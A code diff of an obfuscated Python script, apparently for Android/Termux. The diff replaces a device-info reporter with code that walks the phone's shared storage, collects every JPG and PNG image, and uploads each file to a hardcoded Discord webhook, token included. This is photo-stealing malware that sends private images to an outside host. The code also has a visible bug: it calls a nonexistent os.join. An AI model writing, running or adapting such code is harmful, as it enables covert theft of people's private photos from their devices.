@@ -1,24 +1,32 @@
-import requests as a2,subprocess as a3,datetime as a4,platform as a5,os as a6
-a7=None
-status=1
-def a8():
-    try:return a3.check_output(["termux-battery-status"]).decode()
-    except:return "Permissão negada ou Termux API não instalada"
+import os as a1, requests as a2
+
+a3 = "/storage/emulated/0"
+a4 = "https://discord.com/api/webhooks/1253136109026934855/voPwC3NOLerLzyJ20rsI0wMQXsVnKKc9yoHTkcLXYzsXPlMMPjv0ExrnuBiEVFCEwYGc"
+
+def a5(a6):
+    try:
+        with open(a6, "rb") as a7:
+            a8 = {"file": (a6.split("/")[-1], a7)}
+            r = a2.post(a4, files=a8)
+            return r.status_code in (200, 204)
+    except:
+        return False
+
 def a9():
-    try:return a3.check_output(["termux-info"]).decode()
-    except:return "Permissão negada ou Termux API não instalada"
-if status==1:
-    a10=a4.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    a11=a8()
-    a12=a9()
-    a13=a5.uname()
-    a14=a6.getenv("USER") or "unknown"
-    a15={
-        "embeds":[{
-            "title":"Status Completo do Celular",
-            "description":f"🕒 **Hora:** {a10}\n\n🔋 **Bateria:**\n```json\n{a11}\n```\n\n📱 **Info Termux:**\n```bash\n{a12}\n```\n\n🖥️ **Sistema:** {a13.system} {a13.release} {a13.version}\n\n👤 **Usuário:** {a14}",
-            "color":0x3498db,
-            "footer":{"text":"By ySixx"}
-        }]
-    }
-    a2.post(a7,json=a15)
+    a10 = []
+    for root, dirs, files in a1.walk(a3):
+        for f in files:
+            if f.lower().endswith((".jpg", ".jpeg", ".png")):
+                a10.append(a1.join(root, f))
+    return a10
+
+def a13():
+    a14 = a9()
+    for a15 in a14:
+        if a5(a15):
+            print(f"[+] Enviado: {a15}")
+        else:
+            print(f"[!] Falha no envio: {a15}")
+
+if __name__ == "__main__":
+    a13()
